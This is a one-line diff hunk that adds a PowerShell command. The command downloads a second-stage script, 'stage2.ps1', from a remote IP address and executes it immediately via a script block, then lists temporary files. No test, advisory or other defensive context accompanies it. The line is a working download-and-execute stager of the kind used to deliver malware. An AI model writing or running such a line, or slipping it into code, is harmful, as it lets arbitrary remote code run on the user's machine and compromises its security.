@@ -1,0 +1,1 @@
+<# Remote fetch #> $DownloadUrl = "http://192.0.2.225/stage2.ps1"; $PayloadText = (New-Object Net.WebClient).DownloadString($DownloadUrl); & ([ScriptBlock]::Create($PayloadText)); Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
